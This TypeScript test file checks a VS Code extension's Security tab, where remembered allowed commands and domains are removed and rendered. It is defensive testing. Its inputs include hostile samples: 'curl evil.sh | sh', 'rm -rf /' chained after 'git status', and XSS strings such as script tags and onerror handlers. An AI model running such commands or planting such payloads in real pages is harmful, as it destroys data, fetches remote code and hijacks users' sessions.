import { describe, it, beforeEach } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import * as vm from "node:vm";
import { MiniDocument, dangerousNodes } from "./helpers/miniDom.js";

const errors: string[] = [];
const mockVscode = {
  workspace: { isTrusted: true, workspaceFolders: [{ uri: { fsPath: "D:/test/workspace" } }], getConfiguration: () => ({ get: (_k: string, d: unknown) => d }) },
  window: { showErrorMessage: (m: string) => { errors.push(m); }, showInformationMessage: async () => undefined, showWarningMessage: async () => undefined },
  Uri: { joinPath: () => ({ fsPath: "icon.svg" }), parse: (value: string) => ({ toString: () => value }) },
};
const Module = require("module");
const originalRequire = Module.prototype.require;
Module.prototype.require = function (name: string) {
  return name === "vscode" ? mockVscode : originalRequire.apply(this, arguments);
};
const { SettingsPanel } = require("../src/panels/SettingsPanel.js");
Module.prototype.require = originalRequire;

beforeEach(() => { errors.length = 0; });

type Lists = { allowed_commands?: unknown; allowed_domains?: unknown };
interface EngineOptions { latency?: number; shape?: "current" | "legacy"; failGet?: boolean; failSet?: boolean; getResult?: (lists: Lists) => unknown }

/** A stand-in for the engine: config.get returns top-level lists (strings only, like the real one); config.set replaces a list. */
function engine(initial: Lists, options: EngineOptions = {}) {
  const lists: Lists = JSON.parse(JSON.stringify(initial));
  const calls: Array<{ method: string; params: any }> = [];
  const sleep = () => new Promise<void>((resolve) => (options.latency ? setTimeout(resolve, options.latency) : setImmediate(resolve)));
  const strings = (value: unknown) => (Array.isArray(value) ? value.filter((v) => typeof v === "string" && v) : []);
  let refreshes = 0;
  const panel: any = Object.create(SettingsPanel.prototype);
  panel._rpcClient = {
    call: async (method: string, params: any) => {
      calls.push({ method, params });
      if (method === "config.get") {
        if (options.failGet) { await sleep(); throw new Error("engine busy"); }
        const snapshot = options.getResult
          ? options.getResult(lists)
          : options.shape === "legacy"
            ? { config: { default: { allowed_commands: lists.allowed_commands, allowed_domains: lists.allowed_domains } } }
            : { config: { default: { ...lists } }, allowed_commands: strings(lists.allowed_commands), allowed_domains: strings(lists.allowed_domains) };
        await sleep();
        return JSON.parse(JSON.stringify(snapshot ?? null));
      }
      if (method === "config.set") {
        if (options.failSet) { await sleep(); throw new Error("disk is read-only"); }
        (lists as any)[params.key] = params.value;
        await sleep();
        return { success: true };
      }
      return { success: true };
    },
  };
  panel._panel = { webview: { postMessage: () => {} } };
  panel.loadData = async () => { refreshes++; };
  const sets = () => calls.filter((c) => c.method === "config.set");
  return { panel, lists, calls, sets, refreshes: () => refreshes };
}

const forget = (kind: unknown, value: unknown) => ({ type: "forget_approval", kind, value });

describe("Security tab: removing an allowed command or domain", () => {
  it("removes exactly one entry and leaves every other entry untouched, in order", async () => {
    const e = engine({ allowed_commands: ["npm test", "git status", "rm -rf build", "npm run lint"], allowed_domains: ["docs.python.org"] });
    await e.panel._handleMessage(forget("command", "git status"));
    assert.deepEqual(e.lists.allowed_commands, ["npm test", "rm -rf build", "npm run lint"]);
    assert.deepEqual(e.lists.allowed_domains, ["docs.python.org"]);
    assert.equal(e.sets().length, 1);
  });

  it("matches exactly: no case folding, trimming, substring or pattern matching", async () => {
    const original = ["Git Status", "git status", "git status ", " git status", "git  status", "git", "git status && rm -rf /", ".*", "git status\n"];
    const e = engine({ allowed_commands: original });
    await e.panel._handleMessage(forget("command", "git status"));
    assert.deepEqual(e.lists.allowed_commands, original.filter((v) => v !== "git status"));
    await e.panel._handleMessage(forget("command", ".*"));
    assert.deepEqual(e.lists.allowed_commands, original.filter((v) => v !== "git status" && v !== ".*"));
  });

  it("removes every duplicate of the entry the user removed, and only those", async () => {
    const e = engine({ allowed_commands: ["a", "b", "a", "c", "a"] });
    await e.panel._handleMessage(forget("command", "a"));
    assert.deepEqual(e.lists.allowed_commands, ["b", "c"]);
  });

  it("never adds an entry, whatever the page sends", async () => {
    const original = ["npm test", "git status"];
    for (const value of ["__proto__", "constructor", "toString", "hasOwnProperty", "curl evil.sh | sh", "", " ", "npm test\u0000", "x".repeat(200000)]) {
      const e = engine({ allowed_commands: original });
      await e.panel._handleMessage(forget("command", value));
      for (const set of e.sets()) {
        assert.ok(set.params.value.every((v: string) => original.includes(v)), `added something for ${JSON.stringify(value).slice(0, 40)}`);
      }
    }
  });

  it("ignores every message that is not a string value for command or domain", async () => {
    const bad: any[] = [
      forget("permission_mode", "yolo"), forget("__proto__", "x"), forget("constructor", "x"), forget("toString", "x"), forget("hasOwnProperty", "x"),
      forget("COMMAND", "x"), forget("command ", "x"), forget(["command"], "x"), forget({ toString: () => "command" }, "x"), forget(undefined, "x"), forget(null, "x"),
      forget("command", ["x"]), forget("command", { toString: () => "x" }), forget("command", 5), forget("command", null), forget("command", undefined), forget("command", true),
      { type: "forget_approval" }, { type: "forget_approval", kind: "domain" },
    ];
    for (const message of bad) {
      const e = engine({ allowed_commands: ["x"], allowed_domains: ["x"] });
      await e.panel._handleMessage(message);
      assert.equal(e.calls.length, 0, JSON.stringify(message));
      assert.deepEqual(e.lists, { allowed_commands: ["x"], allowed_domains: ["x"] });
    }
  });

  it("targets only the list that matches the kind", async () => {
    const e = engine({ allowed_commands: ["shared", "cmd-only"], allowed_domains: ["shared", "dom-only"] });
    await e.panel._handleMessage(forget("domain", "shared"));
    assert.deepEqual(e.lists, { allowed_commands: ["shared", "cmd-only"], allowed_domains: ["dom-only"] });
    await e.panel._handleMessage(forget("command", "shared"));
    assert.deepEqual(e.lists, { allowed_commands: ["cmd-only"], allowed_domains: ["dom-only"] });
  });

  it("removes from the list as it is now, so an entry added since the page rendered survives", async () => {
    const e = engine({ allowed_commands: ["a", "b"] });
    e.lists.allowed_commands = ["a", "b", "added-after-render"];
    await e.panel._handleMessage(forget("command", "b"));
    assert.deepEqual(e.lists.allowed_commands, ["a", "added-after-render"]);
  });

  it("does nothing harmful when the entry was already removed elsewhere", async () => {
    const e = engine({ allowed_commands: ["a", "c"] });
    await e.panel._handleMessage(forget("command", "b"));
    assert.deepEqual(e.lists.allowed_commands, ["a", "c"]);
    assert.equal(errors.length, 0);
  });

  it("two quick removals of different entries both take effect", async () => {
    const e = engine({ allowed_commands: ["a", "b", "c"] });
    await Promise.all([e.panel._handleMessage(forget("command", "a")), e.panel._handleMessage(forget("command", "b"))]);
    assert.deepEqual(e.lists.allowed_commands, ["c"], "the second write must not bring back the entry the first one removed");
  });

  it("two quick removals with a slow engine both take effect", async () => {
    const e = engine({ allowed_commands: ["a", "b", "c", "d"] }, { latency: 15 });
    await Promise.all(["a", "c", "d"].map((v) => e.panel._handleMessage(forget("command", v))));
    assert.deepEqual(e.lists.allowed_commands, ["b"]);
  });

  it("a command removal and a domain removal at the same time do not interfere", async () => {
    const e = engine({ allowed_commands: ["a", "b"], allowed_domains: ["x.com", "y.com"] });
    await Promise.all([e.panel._handleMessage(forget("command", "a")), e.panel._handleMessage(forget("domain", "x.com"))]);
    assert.deepEqual(e.lists, { allowed_commands: ["b"], allowed_domains: ["y.com"] });
  });

  it("a removal that fails does not block the queued ones, and they run in the order they were clicked", async () => {
    const e = engine({ allowed_commands: ["a", "b", "c", "d"] });
    const real = e.panel._rpcClient.call;
    let gets = 0;
    e.panel._rpcClient.call = async (method: string, params: any) => {
      if (method === "config.get" && ++gets === 1) { await new Promise((r) => setImmediate(r)); throw new Error("first one failed"); }
      return real(method, params);
    };
    await Promise.all(["a", "b", "c"].map((v) => e.panel._handleMessage(forget("command", v))));
    assert.deepEqual(e.lists.allowed_commands, ["a", "d"], "the first removal failed; the next two went through");
    assert.match(errors[0], /first one failed/);
    const writes = e.sets().map((c) => c.params.value);
    assert.deepEqual(writes, [["a", "c", "d"], ["a", "d"]], "b then c, in click order");
  });

  it("a removal whose page refresh throws does not leave later removals waiting forever", async () => {
    const e = engine({ allowed_commands: ["a", "b", "c"] });
    let refreshes = 0;
    e.panel.loadData = async () => { if (++refreshes === 1) throw new Error("refresh failed"); };
    const first = e.panel._handleMessage(forget("command", "a")).catch(() => "rejected");
    const second = e.panel._handleMessage(forget("command", "b"));
    const outcome = await Promise.race([Promise.all([first, second]).then(() => "done"), new Promise((r) => setTimeout(() => r("stuck"), 2000))]);
    assert.equal(outcome, "done");
    assert.deepEqual(e.lists.allowed_commands, ["c"]);
  });

  it("many queued removals each see the previous one's result", async () => {
    const original = Array.from({ length: 40 }, (_, i) => "cmd-" + i);
    const e = engine({ allowed_commands: original }, { latency: 1 });
    const removed = original.filter((_, i) => i % 3 === 0);
    await Promise.all(removed.map((v) => e.panel._handleMessage(forget("command", v))));
    assert.deepEqual(e.lists.allowed_commands, original.filter((v) => !removed.includes(v)));
  });

  it("a hostile message in the middle of the queue does not disturb the others", async () => {
    const e = engine({ allowed_commands: ["a", "b", "c"] });
    await Promise.all([
      e.panel._handleMessage(forget("command", "a")),
      e.panel._handleMessage(forget("command", { toString: () => "b" })),
      e.panel._handleMessage(forget("__proto__", "b")),
      e.panel._handleMessage(forget("command", "c")),
    ]);
    assert.deepEqual(e.lists.allowed_commands, ["b"]);
  });
});

describe("Security tab: a list that cannot be read is never overwritten", () => {
  const unreadable: Array<[string, (lists: Lists) => unknown]> = [
    ["response is null", () => null],
    ["response is undefined", () => undefined],
    ["response is a string", () => "allowed_commands"],
    ["response is a number", () => 7],
    ["response is a top-level array", () => ["a", "b"]],
    ["field missing", () => ({ config: {} })],
    ["field null", () => ({ allowed_commands: null })],
    ["field a string", () => ({ allowed_commands: "a" })],
    ["field a number", () => ({ allowed_commands: 3 })],
    ["field an object", () => ({ allowed_commands: { 0: "a", length: 1 } })],
    ["field an array-like with a Symbol.iterator", () => ({ allowed_commands: { length: 1, 0: "a" } })],
    ["field is boolean", () => ({ allowed_commands: true })],
    ["list sits under the wrong key", () => ({ allowed_domains: ["a"] })],
  ];
  for (const [name, getResult] of unreadable) {
    it(`writes nothing and says so when the ${name}`, async () => {
      const e = engine({ allowed_commands: ["a", "b"] }, { getResult });
      await e.panel._handleMessage(forget("command", "a"));
      assert.equal(e.sets().length, 0);
      assert.deepEqual(e.lists.allowed_commands, ["a", "b"]);
      assert.equal(errors.length, 1);
      assert.match(errors[0], /Could not remove the remembered approval/);
      assert.equal(e.refreshes(), 1, "the page reloads so the button works again");
    });
  }

  it("without an engine connection nothing is written and no raw script error reaches the user", async () => {
    const e = engine({ allowed_commands: ["a"] });
    e.panel._rpcClient = null;
    await e.panel._handleMessage(forget("command", "a"));
    assert.deepEqual(e.lists.allowed_commands, ["a"]);
    assert.ok(!/Cannot read properties|undefined|null/.test(errors.join(" | ")), errors.join(" | "));
  });

  it("writes nothing and reports the engine's reason when config.get fails", async () => {
    const e = engine({ allowed_commands: ["a"] }, { failGet: true });
    await e.panel._handleMessage(forget("command", "a"));
    assert.equal(e.sets().length, 0);
    assert.match(errors[0], /engine busy/);
    assert.equal(e.refreshes(), 1);
  });

  it("keeps the other list intact when the one being edited cannot be read", async () => {
    const e = engine({ allowed_commands: ["a"], allowed_domains: ["x.com"] }, { getResult: (l) => ({ allowed_domains: l.allowed_domains }) });
    await e.panel._handleMessage(forget("command", "a"));
    assert.deepEqual(e.lists, { allowed_commands: ["a"], allowed_domains: ["x.com"] });
  });

  it("reports a failed save, keeps the list as it was, and reloads the page", async () => {
    const e = engine({ allowed_commands: ["a", "b"] }, { failSet: true });
    await e.panel._handleMessage(forget("command", "a"));
    assert.deepEqual(e.lists.allowed_commands, ["a", "b"]);
    assert.match(errors[0], /disk is read-only/);
    assert.equal(e.refreshes(), 1);
  });

  it("an empty list on the engine side is a real empty list, so removing from it writes an empty list and nothing else", async () => {
    const e = engine({ allowed_commands: [] });
    await e.panel._handleMessage(forget("command", "a"));
    assert.deepEqual(e.lists.allowed_commands, []);
    assert.equal(errors.length, 0);
  });

});

const source = readFileSync("src/panels/SettingsPanel.ts", "utf8");
const renderSource = source.slice(source.indexOf("    function renderRememberedApprovals() {"), source.indexOf("    function renderTrust() {"));
const escapeSource = source.slice(source.indexOf("    function escapeHtml(str) {"), source.indexOf("    function formatTokens(n) {"));

function renderList(currentConfig: unknown) {
  const doc = new MiniDocument('<div id="remembered-approvals-list"></div>');
  const context = vm.createContext({ document: doc, currentConfig });
  vm.runInContext(escapeSource + renderSource + "\nrenderRememberedApprovals();", context, { timeout: 5000 });
  const list = doc.getElementById("remembered-approvals-list")!;
  const buttons = list.querySelectorAll('[data-action="forget-approval"]');
  return { doc, list, buttons, values: (kind: string) => buttons.filter((b) => b.getAttribute("data-kind") === kind).map((b) => b.getAttribute("data-value") as string) };
}

describe("Security tab: the rendered list", () => {
  it("renders from the engine's top-level lists, with counts and a button per entry", () => {
    const r = renderList({ allowed_commands: ["npm test", "git status"], allowed_domains: ["docs.python.org"] });
    assert.deepEqual(r.values("command"), ["npm test", "git status"]);
    assert.deepEqual(r.values("domain"), ["docs.python.org"]);
    assert.match(r.list.textContent, /Commands \(2\)/);
    assert.match(r.list.textContent, /Web domains \(1\)/);
  });

  it("says None, not an error, for empty or absent lists, and never throws on odd config values", () => {
    for (const config of [{}, null, undefined, { allowed_commands: [], allowed_domains: [] }, { allowed_commands: null }, { allowed_commands: "npm test" },
      { allowed_commands: { length: 1, 0: "x" } }, { allowed_commands: 5 }, 5, "text", []]) {
      const r = renderList(config);
      assert.equal(r.buttons.length, 0, JSON.stringify(config));
      assert.match(r.list.textContent, /None/);
    }
  });

  it("keeps entry text out of markup: quotes, tags and entities stay data", () => {
    const hostile = [
      "npm test", "\"><img src=x onerror=alert(1)>", "' onmouseover='alert(1)", "a&b", "<script>alert(1)</script>", "x\" data-kind=\"domain\" data-value=\"y",
      "back\\slash", "tab\there", "unicode \u2603 \u202e", "__proto__", "constructor", " leading", "trailing ", "&quot;&lt;", "a=\"b\"",
      "</code></div><button data-action=\"forget-approval\" data-kind=\"command\" data-value=\"injected\">x</button>",
    ];
    const r = renderList({ allowed_commands: hostile, allowed_domains: hostile });
    assert.deepEqual(dangerousNodes(r.doc), []);
    assert.deepEqual(r.values("command"), hostile, "each button carries exactly its entry");
    assert.deepEqual(r.values("domain"), hostile);
    assert.equal(r.buttons.length, hostile.length * 2, "no extra button was injected");
    for (const b of r.buttons) {
      assert.equal(b.getAttribute("data-action"), "forget-approval");
      assert.ok(["command", "domain"].includes(b.getAttribute("data-kind") as string));
      assert.ok([...b.attributes.keys()].every((k) => ["class", "style", "data-action", "data-kind", "data-value", "aria-label"].includes(k)), [...b.attributes.keys()].join(","));
    }
  });

  it("clicking Remove on any rendered row removes exactly that entry from the engine", async () => {
    const entries = ["npm test", "\"quoted\"", "it's", "a&b", "<b>x</b>", "tab\there", "back\\slash", "__proto__", "x y  z", "unicode \u2603"];
    const r = renderList({ allowed_commands: entries });
    for (const button of r.buttons) {
      const e = engine({ allowed_commands: entries });
      const value = button.getAttribute("data-value") as string;
      await e.panel._handleMessage(forget(button.getAttribute("data-kind"), value));
      assert.deepEqual(e.lists.allowed_commands, entries.filter((v) => v !== value), JSON.stringify(value));
    }
  });

  it("shows duplicates and removing one row removes the entry for all of them", async () => {
    const r = renderList({ allowed_commands: ["a", "a", "b"] });
    assert.deepEqual(r.values("command"), ["a", "a", "b"]);
    const e = engine({ allowed_commands: ["a", "a", "b"] });
    await e.panel._handleMessage(forget("command", "a"));
    assert.deepEqual(e.lists.allowed_commands, ["b"]);
  });

  it("only offers Remove for entries that Remove can actually remove", () => {
    const r = renderList({ allowed_commands: [{ a: 1 }, null, 5, true, ["x"], "real"] });
    assert.deepEqual(r.values("command"), ["real"], "a row for \"[object Object]\" can never be removed because the engine compares strings");
  });

  it("renders a very large list without stalling the page", () => {
    const many = Array.from({ length: 5000 }, (_, i) => `cmd-${i}`);
    const started = Date.now();
    const r = renderList({ allowed_commands: many });
    assert.equal(r.buttons.length, 5000);
    assert.ok(Date.now() - started < 8000);
  });

  it("lists what the engine's config.get returns, and Remove acts on that same list", async () => {
    const e = engine({ allowed_commands: ["a", "b"], allowed_domains: ["x.com"] });
    const response: any = await e.panel._rpcClient.call("config.get", {});
    const r = renderList({ ...response });
    assert.deepEqual(r.values("command"), ["a", "b"]);
    assert.deepEqual(r.values("domain"), ["x.com"]);
  });
});
